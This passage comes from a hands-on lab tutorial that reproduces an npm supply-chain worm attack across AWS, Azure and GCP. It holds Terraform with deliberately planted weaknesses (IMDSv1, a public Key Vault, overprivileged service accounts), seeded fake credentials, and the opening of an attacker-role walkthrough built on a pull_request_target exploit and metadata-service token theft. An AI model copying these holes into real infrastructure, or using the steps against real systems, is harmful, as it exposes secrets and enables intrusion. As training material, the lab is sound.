  subnet_id              = data.aws_subnets.default.ids[0]
  vpc_security_group_ids = [aws_security_group.lab_sg.id]

  # ===================================================================
  # CRITICAL MISCONFIGURATION: IMDSv1 ENABLED
  # ===================================================================
  # http_tokens = "optional" means IMDSv1 is allowed.
  # IMDSv1: Any process on the instance can GET http://169.254.169.254/...
  #         and receive IAM role temporary credentials. No auth needed.
  # IMDSv2: Requires a PUT request first to obtain a session token,
  #         which must be included in subsequent requests as a header.
  #
  # ATTACKER EXPLOITS: curl to IMDS returns credentials with zero auth
  # SECURE ALTERNATIVE: http_tokens = "required" (forces IMDSv2)
  # ===================================================================
  metadata_options {
    http_endpoint               = "enabled"   # IMDS is reachable
    http_tokens                 = "optional"  # IMDSv1 allowed (THE VULNERABILITY)
    http_put_response_hop_limit = 2           # Should be 1 for container isolation
    instance_metadata_tags      = "enabled"   # Allow tags via IMDS (informational)
  }

  # User data script that installs tools and seeds fake credentials
  # This simulates a real developer workstation's filesystem
  user_data = <<USERDATA
#!/bin/bash
set -x

# Install Node.js 20.x and git (needed for the worm payload)
dnf install -y nodejs git jq 2>/dev/null || yum install -y nodejs git jq 2>/dev/null

# Create a "developer" user with a realistic home directory
useradd -m -s /bin/bash developer 2>/dev/null || true
HOME_DIR="/home/developer"

# --- Seed fake credentials that TruffleHog will discover ---

# 1. Fake .npmrc with npm tokens
cat > $HOME_DIR/.npmrc << 'NPMRC'
//registry.npmjs.org/:_authToken=npm_NvTcH2025pRd4aBcDeFgHiJkLmNoPqRsTuVwXy
@novatech:registry=http://internal-registry.novatech.dev:4873/
//internal-registry.novatech.dev:4873/:_authToken=npm_NvTcHiNt2025xYzAbCdEfGhIjKlMnOpQrStUv
NPMRC

# 2. Fake .env with secrets
cat > $HOME_DIR/.env << 'DOTENV'
DATABASE_URL=postgresql://novatech_admin:S3cretP@ss2025!@prod-db.novatech.internal:5432/production
REDIS_URL=redis://:r3d1sP@ss!@cache.novatech.internal:6379/0
STRIPE_SECRET_KEY=sk_live_51NvTcH2025aBcDeFgHiJkLm
SENDGRID_API_KEY=SG.NvTcH2025aBcDeFgHiJkLm.xYzAbCdEfGhIjKlMnOpQrStUvWxYz0123456789ab
JWT_SECRET=SIMULATED-jwt-hmac-secret-NovaTech-HS256-production
GITHUB_TOKEN=ghp_NvTcH2025aBcDeFgHiJkLmNoPqRsTuVwXyZa
DOTENV

# 3. SSH key (auto-generated)
mkdir -p $HOME_DIR/.ssh
ssh-keygen -t ed25519 -f $HOME_DIR/.ssh/id_ed25519 -N "" -C "alex@novatech.dev" -q 2>/dev/null

# 4. Git repo with "accidentally committed" credentials in history
# This is what TruffleHog excels at finding -- secrets that were committed
# then "deleted" but still exist in the git history
mkdir -p $HOME_DIR/projects/internal-api
cd $HOME_DIR/projects/internal-api
git init -q
git config user.email "alex@novatech.dev"
git config user.name "Alex Chen"

# Commit 1: Developer accidentally commits credentials
cat > config.py << 'PYCONFIG'
# NovaTech Internal API Configuration
AWS_ACCESS_KEY_ID = "AKIANVTCHPROD8X2QLJY"
AWS_SECRET_ACCESS_KEY = "R9fKb3zG7hLp2vXwN4mQ8cYdA1eT6uJ5sO0iWrBt"
DATABASE_PASSWORD = "NovaTech-Prod-DB-P@ssw0rd-2025!"
PYCONFIG
git add -A && git commit -q -m "Initial API configuration"

# Commit 2: Developer "removes" the credentials
# (but they remain forever in git history!)
cat > config.py << 'PYCONFIG2'
# NovaTech Internal API Configuration
# Credentials moved to environment variables (see .env.example)
import os
AWS_ACCESS_KEY_ID = os.environ.get("AWS_ACCESS_KEY_ID")
AWS_SECRET_ACCESS_KEY = os.environ.get("AWS_SECRET_ACCESS_KEY")
DATABASE_PASSWORD = os.environ.get("DATABASE_PASSWORD")
PYCONFIG2
git add -A && git commit -q -m "fix: move credentials to environment variables"

# 5. Fake AWS credentials file
mkdir -p $HOME_DIR/.aws
cat > $HOME_DIR/.aws/credentials << 'AWSCREDS'
[default]
aws_access_key_id = AKIANVTCHPROD8X2QLJY
aws_secret_access_key = R9fKb3zG7hLp2vXwN4mQ8cYdA1eT6uJ5sO0iWrBt

[novatech-prod]
aws_access_key_id = AKIANVTCHDEV93M7XKPW
aws_secret_access_key = T4kLm8nP2qR5vW7xY9zA3cE6fH1jN4oS8uB0dG2i
AWSCREDS

# Fix ownership so the "developer" user owns everything
chown -R developer:developer $HOME_DIR

echo "=== AWS EC2 credential seeding complete ==="
USERDATA

  tags = {
    Name = "${local.name}-victim-ec2"
  }
}

# --- AWS Secrets Manager Secrets ---
# These are the high-value secrets the worm will exfiltrate.
# recovery_window_in_days = 0 allows immediate deletion for lab cleanup.

resource "aws_secretsmanager_secret" "db_creds" {
  name                    = "${local.name}/prod/database/credentials"
  description             = "Production PostgreSQL database credentials"
  recovery_window_in_days = 0
}

resource "aws_secretsmanager_secret_version" "db_creds" {
  secret_id = aws_secretsmanager_secret.db_creds.id
  secret_string = jsonencode({
    username = "novatech_admin"
    password = "N0v4T3ch!Pr0d#2025"
    host     = "prod-db.cluster-abc123.us-east-1.rds.amazonaws.com"
    port     = 5432
    database = "novatech_production"
  })
}

resource "aws_secretsmanager_secret" "stripe_key" {
  name                    = "${local.name}/prod/api/stripe-key"
  description             = "Stripe API secret key for payment processing"
  recovery_window_in_days = 0
}

resource "aws_secretsmanager_secret_version" "stripe_key" {
  secret_id     = aws_secretsmanager_secret.stripe_key.id
  secret_string = "sk_live_SIMULATED_51O4xKy3dBz3LkNovaTech2025xYz"
}

resource "aws_secretsmanager_secret" "oauth_secret" {
  name                    = "${local.name}/prod/oauth/client-secret"
  description             = "OAuth2 client secret for SSO integration"
  recovery_window_in_days = 0
}

resource "aws_secretsmanager_secret_version" "oauth_secret" {
  secret_id     = aws_secretsmanager_secret.oauth_secret.id
  secret_string = "SIMULATED-oauth-client-secret-NovaTech-2025-xyz789"
}

# --- AWS SSM Parameter Store ---
# SecureString parameters are encrypted with the default AWS-managed KMS key.
# The --with-decryption flag is needed to read them.

resource "aws_ssm_parameter" "db_conn" {
  name        = "/${local.name}/prod/database/connection-string"
  description = "Production database connection string"
  type        = "SecureString"
  value       = "postgresql://novatech_admin:N0v4T3ch!@prod-db.abc123.rds.amazonaws.com:5432/novatech"
}

resource "aws_ssm_parameter" "jwt" {
  name        = "/${local.name}/prod/app/jwt-secret"
  description = "JWT HMAC signing secret for API authentication"
  type        = "SecureString"
  value       = "SIMULATED-jwt-hmac-secret-NovaTech-HS256-production-2025"
}

# ============================================================================
#                             AZURE RESOURCES
# ============================================================================
# Creates:
#   - Resource Group containing all Azure resources
#   - Linux VM with System-Assigned Managed Identity and SSH access
#   - Key Vault with 3 secrets
#   - Access policy granting the VM's identity access to Key Vault
#   - VNet, Subnet, NSG, Public IP, NIC
#   - Seeded fake credentials on disk
#
# The attacker will:
#   1. SSH into the Azure VM
#   2. curl the Azure IMDS to steal a Managed Identity Bearer token
#   3. Use that token to call the Key Vault REST API directly with curl
# ============================================================================

data "azurerm_client_config" "current" {}

resource "azurerm_resource_group" "lab" {
  name     = "${local.name}-rg"
  location = var.azure_location
  tags = {
    Project  = "cloud-attack-lab"
    Scenario = "shai-hulud-2"
  }
}

# --- Azure Key Vault ---
# Stores secrets that the worm exfiltrates.
# public_network_access_enabled = true is an intentional misconfiguration.
#
# ATTACKER EXPLOITS: Key Vault is accessible from any network
# SECURE ALTERNATIVE: Use private endpoints and disable public access

resource "azurerm_key_vault" "lab" {
  name                          = "${var.project_prefix}kv${local.suffix}"
  location                      = azurerm_resource_group.lab.location
  resource_group_name           = azurerm_resource_group.lab.name
  tenant_id                     = data.azurerm_client_config.current.tenant_id
  sku_name                      = "standard"
  public_network_access_enabled = true    # MISCONFIGURATION
  purge_protection_enabled      = false   # Allows clean lab teardown

  # Access policy for the Terraform deployer (you)
  access_policy {
    tenant_id          = data.azurerm_client_config.current.tenant_id
    object_id          = data.azurerm_client_config.current.object_id
    secret_permissions = ["Get", "List", "Set", "Delete", "Purge", "Recover"]
  }
}

resource "azurerm_key_vault_secret" "cosmos_conn" {
  name         = "cosmos-db-connection-string"
  value        = "AccountEndpoint=https://novatech-prod.documents.azure.com:443/;AccountKey=SIMULATED-cosmos-primary-key-NovaTech2025base64encoded=="
  key_vault_id = azurerm_key_vault.lab.id
}

resource "azurerm_key_vault_secret" "sendgrid" {
  name         = "sendgrid-api-key"
  value        = "SG.SIMULATED.NovaTech2025-sendgrid-api-key-for-email-delivery"
  key_vault_id = azurerm_key_vault.lab.id
}

resource "azurerm_key_vault_secret" "storage_key" {
  name         = "storage-account-key"
  value        = "SIMULATED-azure-storage-account-primary-access-key-NovaTech2025+base64=="
  key_vault_id = azurerm_key_vault.lab.id
}

# --- Azure Networking ---
# The VM needs a public IP and an NSG allowing SSH for the lab.
# In production, use a bastion host or Azure Serial Console instead.

resource "azurerm_virtual_network" "lab" {
  name                = "${local.name}-vnet"
  address_space       = ["10.1.0.0/16"]
  location            = azurerm_resource_group.lab.location
  resource_group_name = azurerm_resource_group.lab.name
}

resource "azurerm_subnet" "lab" {
  name                 = "${local.name}-subnet"
  resource_group_name  = azurerm_resource_group.lab.name
  virtual_network_name = azurerm_virtual_network.lab.name
  address_prefixes     = ["10.1.1.0/24"]
}

resource "azurerm_public_ip" "lab" {
  name                = "${local.name}-pip"
  location            = azurerm_resource_group.lab.location
  resource_group_name = azurerm_resource_group.lab.name
  allocation_method   = "Static"
  sku                 = "Standard"
}

resource "azurerm_network_security_group" "lab" {
  name                = "${local.name}-nsg"
  location            = azurerm_resource_group.lab.location
  resource_group_name = azurerm_resource_group.lab.name

  security_rule {
    name                       = "AllowSSH"
    priority                   = 100
    direction                  = "Inbound"
    access                     = "Allow"
    protocol                   = "Tcp"
    source_port_range          = "*"
    destination_port_range     = "22"
    source_address_prefix      = "*"
    destination_address_prefix = "*"
  }
}

resource "azurerm_network_interface" "lab" {
  name                = "${local.name}-nic"
  location            = azurerm_resource_group.lab.location
  resource_group_name = azurerm_resource_group.lab.name

  ip_configuration {
    name                          = "primary"
    subnet_id                     = azurerm_subnet.lab.id
    private_ip_address_allocation = "Dynamic"
    public_ip_address_id          = azurerm_public_ip.lab.id
  }
}

resource "azurerm_network_interface_security_group_association" "lab" {
  network_interface_id      = azurerm_network_interface.lab.id
  network_security_group_id = azurerm_network_security_group.lab.id
}

# --- Azure Linux VM ---
# Ubuntu 24.04 LTS with System-Assigned Managed Identity.
# Any code running on this VM can request a token from Azure IMDS.
#
# ATTACKER EXPLOITS: curl to 169.254.169.254 with Metadata:true header
#   returns a Bearer token for the Managed Identity
# SECURE ALTERNATIVE: Use User-Assigned Identity with minimal IAM bindings

resource "azurerm_linux_virtual_machine" "lab" {
  name                            = "${local.name}-vm"
  resource_group_name             = azurerm_resource_group.lab.name
  location                        = azurerm_resource_group.lab.location
  size                            = "Standard_B1s"
  admin_username                  = "azureuser"
  admin_password                  = "P@ssw0rd!NovaTech2025Lab"
  disable_password_authentication = false
  network_interface_ids           = [azurerm_network_interface.lab.id]

  # System-Assigned Managed Identity -- automatically creates an identity
  # in Entra ID when the VM is created. The worm steals this identity's token.
  identity {
    type = "SystemAssigned"
  }

  os_disk {
    caching              = "ReadWrite"
    storage_account_type = "Standard_LRS"
  }

  source_image_reference {
    publisher = "Canonical"
    offer     = "ubuntu-24_04-lts"
    sku       = "server"
    version   = "latest"
  }

  # Install Node.js and seed fake credentials (same pattern as AWS)
  custom_data = base64encode(<<CUSTOMDATA
#!/bin/bash
set -x
curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
apt-get install -y nodejs git jq curl

useradd -m -s /bin/bash developer 2>/dev/null || true
HOME_DIR="/home/developer"

cat > $HOME_DIR/.npmrc << 'NPMRC'
//registry.npmjs.org/:_authToken=npm_NvTcHazr2025aBcDeFgHiJkLmNoPqRsTuVw
NPMRC

cat > $HOME_DIR/.env << 'DOTENV'
DATABASE_URL=postgresql://admin:S3cretP@ss!@prod-db.novatech.internal:5432/prod
AZURE_CLIENT_SECRET=NvT~azr~2025~cLiEnTsEcReTvAlUe1234
GITHUB_TOKEN=ghp_NvTcHazr2025xYzAbCdEfGhIjKlMnOpQrStU
DOTENV

mkdir -p $HOME_DIR/.ssh
ssh-keygen -t ed25519 -f $HOME_DIR/.ssh/id_ed25519 -N "" -C "alex@novatech.dev" -q 2>/dev/null

mkdir -p $HOME_DIR/projects/internal-api
cd $HOME_DIR/projects/internal-api
git init -q && git config user.email "alex@novatech.dev" && git config user.name "Alex Chen"
printf 'AZURE_CLIENT_SECRET = "NvT~azr~2025~cLiEnTsEcReTvAlUe1234"\nAZURE_STORAGE_KEY = "NvTcHaZrStOrAgEkEy2025Base64EnCoDeDvAlUe=="\n' > config.py
git add -A && git commit -q -m "Initial config with Azure credentials"
printf 'import os\nAZURE_CLIENT_SECRET = os.environ["AZURE_CLIENT_SECRET"]\n' > config.py
git add -A && git commit -q -m "fix: remove hardcoded Azure secrets"

mkdir -p $HOME_DIR/.azure
echo '{"subscriptions":[{"id":"00000000-0000-0000-0000-000000000000","name":"NovaTech-Prod"}]}' > $HOME_DIR/.azure/azureProfile.json

chown -R developer:developer $HOME_DIR
echo "=== Azure VM credential seeding complete ==="
CUSTOMDATA
  )
}

# Grant the VM's Managed Identity access to Key Vault
# OVERPRIVILEGED: Get + List on ALL secrets in the vault
# SECURE ALTERNATIVE: Use RBAC roles scoped to specific secrets
resource "azurerm_key_vault_access_policy" "vm_identity" {
  key_vault_id       = azurerm_key_vault.lab.id
  tenant_id          = data.azurerm_client_config.current.tenant_id
  object_id          = azurerm_linux_virtual_machine.lab.identity[0].principal_id
  secret_permissions = ["Get", "List"]
}

# ============================================================================
#                              GCP RESOURCES
# ============================================================================
# Creates:
#   - Service Account with project-level Secret Manager access
#   - Compute Engine instance with the SA attached
#   - 3 Secret Manager secrets
#   - Seeded fake credentials on disk
#
# The attacker will:
#   1. SSH into the GCE instance via gcloud compute ssh
#   2. curl the GCP metadata server to steal the SA's OAuth2 token
#   3. Use that token to call the Secret Manager REST API directly
# ============================================================================

# Service Account -- overprivileged with project-wide Secret Manager access
# ATTACKER EXPLOITS: Can read ALL secrets in the entire GCP project
# SECURE ALTERNATIVE: Grant roles/secretmanager.secretAccessor on individual secrets
resource "google_service_account" "lab_sa" {
  account_id   = "${var.project_prefix}-lab-sa-${local.suffix}"
  display_name = "Shai-Hulud Lab Service Account"
  description  = "Intentionally overprivileged SA for the supply chain worm lab"
}

# Project-level IAM bindings (too broad!)
resource "google_project_iam_member" "sa_secret_accessor" {
  project = var.gcp_project_id
  role    = "roles/secretmanager.secretAccessor"
  member  = "serviceAccount:${google_service_account.lab_sa.email}"
}

resource "google_project_iam_member" "sa_secret_viewer" {
  project = var.gcp_project_id
  role    = "roles/secretmanager.viewer"
  member  = "serviceAccount:${google_service_account.lab_sa.email}"
}

# --- GCP Secret Manager Secrets ---
resource "google_secret_manager_secret" "bigquery_key" {
  secret_id = "${var.project_prefix}-bigquery-key-${local.suffix}"
  replication {
    auto {}
  }
}
resource "google_secret_manager_secret_version" "bigquery_key" {
  secret      = google_secret_manager_secret.bigquery_key.id
  secret_data = "SIMULATED-bigquery-service-account-key-json-NovaTech-2025"
}

resource "google_secret_manager_secret" "pubsub_creds" {
  secret_id = "${var.project_prefix}-pubsub-creds-${local.suffix}"
  replication {
    auto {}
  }
}
resource "google_secret_manager_secret_version" "pubsub_creds" {
  secret      = google_secret_manager_secret.pubsub_creds.id
  secret_data = "SIMULATED-pubsub-api-credentials-NovaTech-analytics-pipeline-2025"
}

resource "google_secret_manager_secret" "firebase_key" {
  secret_id = "${var.project_prefix}-firebase-key-${local.suffix}"
  replication {
    auto {}
  }
}
resource "google_secret_manager_secret_version" "firebase_key" {
  secret      = google_secret_manager_secret.firebase_key.id
  secret_data = "SIMULATED-firebase-admin-sdk-private-key-NovaTech-2025"
}

# --- GCP Compute Engine Instance ---
resource "google_compute_instance" "lab_instance" {
  name         = "${var.project_prefix}-lab-vm-${local.suffix}"
  machine_type = "e2-micro"
  zone         = var.gcp_zone

  boot_disk {
    initialize_params {
      image = "debian-cloud/debian-12"
    }
  }

  network_interface {
    network = "default"
    access_config {} # Assigns a public IP
  }

  # Attach the overprivileged service account
  # scopes = ["cloud-platform"] is the broadest scope: allows all API access
  # SECURE ALTERNATIVE: Use specific scopes like ["https://www.googleapis.com/auth/cloud-platform.read-only"]
  service_account {
    email  = google_service_account.lab_sa.email
    scopes = ["cloud-platform"]
  }

  # Install Node.js and seed fake credentials
metadata_startup_script = <<STARTUP
#!/bin/bash
set -x
curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
apt-get install -y nodejs git jq curl

useradd -m -s /bin/bash developer 2>/dev/null || true
HOME_DIR="/home/developer"

cat > $HOME_DIR/.npmrc << 'NPMRC'
//registry.npmjs.org/:_authToken=npm_NvTcHgcp2025aBcDeFgHiJkLmNoPqRsTuVw
NPMRC

cat > $HOME_DIR/.env << 'DOTENV'
GCP_API_KEY=AIzaSyNvTcH2025GcPaPiKeYaBcDeFgHiJkLmNo
GITHUB_TOKEN=ghp_NvTcHgcp2025xYzAbCdEfGhIjKlMnOpQrStU
FIREBASE_ADMIN_SDK_KEY=SIMULATED-firebase-admin-key-data
DOTENV

mkdir -p $HOME_DIR/.ssh
ssh-keygen -t ed25519 -f $HOME_DIR/.ssh/id_ed25519 -N "" -q 2>/dev/null

mkdir -p $HOME_DIR/projects/analytics-pipeline
cd $HOME_DIR/projects/analytics-pipeline
git init -q && git config user.email "alex@novatech.dev" && git config user.name "Alex Chen"
printf 'GCP_PRIVATE_KEY = "-----BEGIN RSA PRIVATE KEY-----\\nSIMULATED_KEY\\n-----END RSA PRIVATE KEY-----"\nBIGQUERY_CREDENTIALS = {"type":"service_account","project_id":"novatech-prod","private_key":"SIMULATED"}\n' > config.py
git add -A && git commit -q -m "Add GCP service credentials for analytics"
printf 'import os\nGCP_PRIVATE_KEY = os.environ["GCP_PRIVATE_KEY"]\n' > config.py
git add -A && git commit -q -m "refactor: use environment variables for credentials"

mkdir -p $HOME_DIR/.config/gcloud
printf '{"type":"authorized_user","client_id":"SIMULATED.apps.googleusercontent.com","client_secret":"SIMULATED-gcp-secret","refresh_token":"SIMULATED-refresh-token-NovaTech"}\n' > $HOME_DIR/.config/gcloud/application_default_credentials.json

chown -R developer:developer $HOME_DIR
echo "=== GCP GCE credential seeding complete ==="
STARTUP
  allow_stopping_for_update = true
}
TFEOF
echo "main.tf created ($(wc -l < main.tf) lines)"
```

### outputs.tf

```bash
cat > outputs.tf << 'EOF'
# ============================================================================
# OUTPUTS -- Values needed for the attack phase
# ============================================================================
# These outputs provide all the information needed to execute the attack.
# Run: terraform output <output_name> to retrieve any individual value.
# Run: terraform output attack_summary for the full overview.
# ============================================================================

# --- SSH Key for AWS ---
output "aws_ssh_private_key" {
  description = "SSH private key for EC2 access. Save to file with: terraform output -raw aws_ssh_private_key > lab-key.pem && chmod 600 lab-key.pem"
  value       = tls_private_key.ssh_key.private_key_openssh
  sensitive   = true
}

# --- AWS ---
output "aws_instance_id" {
  description = "EC2 instance ID"
  value       = aws_instance.lab_instance.id
}

output "aws_instance_public_ip" {
  description = "EC2 instance public IP for SSH access"
  value       = aws_instance.lab_instance.public_ip
}

output "aws_iam_role_arn" {
  description = "IAM role ARN attached to the EC2 instance"
  value       = aws_iam_role.ec2_role.arn
}

output "aws_secrets_prefix" {
  description = "Prefix for Secrets Manager secret names"
  value       = local.name
}

output "aws_ssm_prefix" {
  description = "Prefix for SSM Parameter Store parameter names"
  value       = "/${local.name}"
}

# --- Azure ---
output "azure_vm_public_ip" {
  description = "Azure VM public IP for SSH access"
  value       = azurerm_public_ip.lab.ip_address
}

output "azure_resource_group" {
  description = "Azure resource group name"
  value       = azurerm_resource_group.lab.name
}

output "azure_keyvault_name" {
  description = "Azure Key Vault name (needed for REST API calls from inside the VM)"
  value       = azurerm_key_vault.lab.name
}

output "azure_keyvault_uri" {
  description = "Azure Key Vault URI"
  value       = azurerm_key_vault.lab.vault_uri
}

output "azure_managed_identity_id" {
  description = "Azure VM Managed Identity principal ID"
  value       = azurerm_linux_virtual_machine.lab.identity[0].principal_id
}

# --- GCP ---
output "gcp_instance_name" {
  description = "GCP Compute Engine instance name"
  value       = google_compute_instance.lab_instance.name
}

output "gcp_instance_zone" {
  description = "GCP zone where the instance runs"
  value       = var.gcp_zone
}

output "gcp_service_account_email" {
  description = "GCP service account email attached to the instance"
  value       = google_service_account.lab_sa.email
}

output "gcp_project_id" {
  description = "GCP project ID"
  value       = var.gcp_project_id
}

output "gcp_secret_prefix" {
  description = "Prefix for GCP Secret Manager secret names"
  value       = var.project_prefix
}

# --- Combined Attack Summary ---
output "attack_summary" {
  description = "Complete summary of all attack parameters"
  value       = <<-EOT

    ============================================================
    SHAI-HULUD 2.0 LAB -- ATTACK PARAMETERS
    ============================================================

    VERDACCIO REGISTRY:
      URL:         http://localhost:4873
      User:        novatech-bot
      Packages:    @novatech/auth-helpers, db-connector, logger, config-loader, api-client

    AWS:
      EC2 Public IP:   ${aws_instance.lab_instance.public_ip}
      SSH Command:      ssh -i lab-key.pem ec2-user@${aws_instance.lab_instance.public_ip}
      IAM Role ARN:    ${aws_iam_role.ec2_role.arn}
      Secrets Prefix:  ${local.name}/prod/*
      SSM Prefix:      /${local.name}/prod/*
      Instance ID:     ${aws_instance.lab_instance.id}

    AZURE:
      VM Public IP:    ${azurerm_public_ip.lab.ip_address}
      SSH Command:     ssh azureuser@${azurerm_public_ip.lab.ip_address}
      SSH Password:    P@ssw0rd!NovaTech2025Lab
      Key Vault Name:  ${azurerm_key_vault.lab.name}
      Key Vault URI:   ${azurerm_key_vault.lab.vault_uri}
      Resource Group:  ${azurerm_resource_group.lab.name}

    GCP:
      Instance Name:   ${google_compute_instance.lab_instance.name}
      Zone:            ${var.gcp_zone}
      SSH Command:     gcloud compute ssh ${google_compute_instance.lab_instance.name} --zone=${var.gcp_zone}
      Service Account: ${google_service_account.lab_sa.email}
      Secret Prefix:   ${var.project_prefix}-*-${local.suffix}

    NPM TOKEN:
      Stored in: ~/.npmrc (or $$VICTIM_NPM_TOKEN environment variable)

    IMPORTANT: Save the SSH key first!
      terraform output -raw aws_ssh_private_key > lab-key.pem
      chmod 600 lab-key.pem

  EOT
}
EOF
echo "outputs.tf created"
```

### Deploy the Infrastructure

```bash
cd ~/shai-hulud-lab/terraform

# IMPORTANT: Create and configure your variables file first!
cp terraform.tfvars.example terraform.tfvars

echo "==========================================================="
echo " EDIT terraform.tfvars NOW before proceeding!"
echo " Fill in your azure_subscription_id and gcp_project_id"
echo "==========================================================="
echo ""
echo "Then run these commands in order:"
echo "  terraform init"
echo "  terraform plan"
echo "  terraform apply"
```

### Step 4a: Initialize Terraform

```bash
terraform init
```

**What this does:**
- Downloads provider plugins for AWS (~6.35), Azure (~4.63), GCP (~7.22), TLS, and Random
- Stores them in `.terraform/providers/`
- Creates `.terraform.lock.hcl` to pin exact provider versions
- Initializes the local state backend

**Expected output:**
```
Initializing the backend...
Initializing provider plugins...
- Finding hashicorp/aws versions matching "~> 6.35"...
- Installing hashicorp/aws v6.35.x...
...
Terraform has been successfully initialized!
```

### Step 4b: Review the execution plan

```bash
terraform plan
```

**What this does:**
- Reads all `.tf` files in the current directory
- Compares desired state with actual state (nothing exists yet)
- Shows you exactly what will be created
- Makes NO changes to any cloud provider

**Expected output:** Approximately 30-35 resources to create:
- AWS: key pair, security group, EC2 instance, IAM role + policy + profile, 3 secrets + 3 versions, 2 SSM params
- Azure: resource group, vnet, subnet, public IP, NSG, NIC, NIC-NSG association, VM, Key Vault, 3 KV secrets, KV access policy
- GCP: service account, 2 IAM members, 3 secrets + 3 versions, compute instance

### Step 4c: Deploy

```bash
terraform apply
```

Type `yes` when prompted. Deployment takes 3-5 minutes.

**Expected output:**
```
Apply complete! Resources: ~33 added, 0 changed, 0 destroyed.

Outputs:

attack_summary = <<EOT
  ...
EOT
```

### Step 4d: Save the SSH key and note attack parameters

```bash
# Save the SSH private key for AWS EC2 access
terraform output -raw aws_ssh_private_key > lab-key.pem
chmod 600 lab-key.pem

# Display the full attack summary
terraform output attack_summary
```

**Save this output!** You will reference it throughout the attack.

### Step 4e: Wait for VMs to finish setup (3-5 minutes)

The user_data/startup scripts install Node.js and seed fake credentials. Wait for them to complete:

# Install sshpass for Azure VM access (password-based SSH)
sudo apt install -y sshpass

```bash
echo "=== Waiting for VMs to finish setup ==="
echo "This typically takes 2-4 minutes after terraform apply completes."
echo ""

# Check AWS EC2
echo "Checking AWS EC2..."
for i in $(seq 1 12); do
  ssh -i lab-key.pem -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    ec2-user@$(terraform output -raw aws_instance_public_ip) \
    "sudo test -f /home/developer/.env && echo READY" 2>/dev/null && break
  echo "  Not ready yet (attempt $i/12). Waiting 15 seconds..."
  sleep 15
done

# Check Azure VM
echo ""
echo "Checking Azure VM..."
for i in $(seq 1 12); do
  sshpass -p 'P@ssw0rd!NovaTech2025Lab' \
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    azureuser@$(terraform output -raw azure_vm_public_ip) \
    "sudo test -f /home/developer/.env && echo READY" 2>/dev/null && break
  echo "  Not ready yet (attempt $i/12). Waiting 15 seconds..."
  sleep 15
done

# Check GCP GCE
echo ""
echo "Checking GCP GCE..."
for i in $(seq 1 6); do
  gcloud compute ssh $(terraform output -raw gcp_instance_name) \
    --zone=$(terraform output -raw gcp_instance_zone) \
    --command="sudo test -f /home/developer/.env && echo READY" 2>/dev/null && break
  echo "  Not ready yet (attempt $i/6). Waiting 20 seconds..."
  sleep 20
done

echo ""
echo "If all three show READY, proceed to Part 2."
echo "If sshpass is not installed, SSH into Azure manually with password: P@ssw0rd!NovaTech2025Lab"
```

---

# PART 2: PRE-ATTACK VERIFICATION

Before attacking, verify that all infrastructure is running and all vulnerabilities are in place. Run each check and confirm the expected output.

## Verify 1: Verdaccio Has 5 Packages

```bash
curl -s "http://localhost:4873/-/v1/search?text=novatech&size=20" | jq '.objects | length'
```

**Expected:** `5`

## Verify 2: AWS Secrets Exist

```bash
aws secretsmanager list-secrets \
  --query "SecretList[?starts_with(Name,'$(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw aws_secrets_prefix)')].Name" \
  --output table
```

**Expected:** 3 secrets: `*/prod/database/credentials`, `*/prod/api/stripe-key`, `*/prod/oauth/client-secret`

## Verify 3: AWS EC2 Has IMDSv1 Enabled (the vulnerability)

```bash
aws ec2 describe-instances \
  --instance-ids $(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw aws_instance_id) \
  --query 'Reservations[0].Instances[0].MetadataOptions.{HttpTokens:HttpTokens,HttpEndpoint:HttpEndpoint}' \
  --output json
```

**Expected:**
```json
{
    "HttpTokens": "optional",
    "HttpEndpoint": "enabled"
}
```

`"optional"` means IMDSv1 is allowed. This is the critical vulnerability the worm exploits.

## Verify 4: Azure Key Vault Has Secrets

```bash
az keyvault secret list \
  --vault-name $(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw azure_keyvault_name) \
  --query '[].name' \
  --output table
```

**Expected:** 3 secrets: `cosmos-db-connection-string`, `sendgrid-api-key`, `storage-account-key`

## Verify 5: GCP Secret Manager Has Secrets

```bash
gcloud secrets list \
  --project=$(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw gcp_project_id) \
  --format="table(name)" \
  --filter="name:$(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw gcp_secret_prefix)"
```

**Expected:** 3 secrets with your prefix: `*-bigquery-key-*`, `*-pubsub-creds-*`, `*-firebase-key-*`

## Verify 6: npm Token is Valid

```bash
curl -s -H "Authorization: Bearer ${VICTIM_NPM_TOKEN}" http://localhost:4873/-/whoami
```

**Expected:** `novatech-bot`

## Verify 7: SSH Works to All Three VMs

```bash
# AWS
ssh -i ~/shai-hulud-lab/terraform/lab-key.pem -o StrictHostKeyChecking=no \
  ec2-user@$(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw aws_instance_public_ip) \
  "echo AWS_OK && node --version"

# Azure (password: P@ssw0rd!NovaTech2025Lab)
ssh -o StrictHostKeyChecking=no \
  azureuser@$(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw azure_vm_public_ip) \
  "echo AZURE_OK && node --version"

# GCP
gcloud compute ssh \
  $(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw gcp_instance_name) \
  --zone=$(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw gcp_instance_zone) \
  --command="echo GCP_OK && node --version"
```

**Expected:** All three should output `*_OK` and a Node.js version (20.x).

## Verify 8: Seeded Credentials Exist on VMs

```bash
# Check that TruffleHog has something to find on the AWS instance
ssh -i ~/shai-hulud-lab/terraform/lab-key.pem -o StrictHostKeyChecking=no \
  ec2-user@$(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw aws_instance_public_ip) \
  "ls -la /home/developer/.env /home/developer/.npmrc /home/developer/projects/internal-api/.git 2>/dev/null && echo 'SEEDS OK'"
```

**Expected:** File listings and `SEEDS OK`

If all 8 verifications pass, the lab is ready. Time to attack.

---

# PART 3: ATTACK EXECUTION

From this point forward, you are the attacker.

---

## PHASE 0: Initial Access -- The pull_request_target Exploit

### Step 1: Create the Vulnerable Repository

#### Context (Attacker Mindset)

You are a threat actor who has identified a target: NovaTech, a company that publishes npm packages via GitHub Actions. You notice their CI/CD workflow uses `pull_request_target` -- a GitHub Actions trigger that runs in the base repository's trusted context. If the workflow checks out the PR's head commit (the attacker's code), then your code runs with access to all repository secrets.

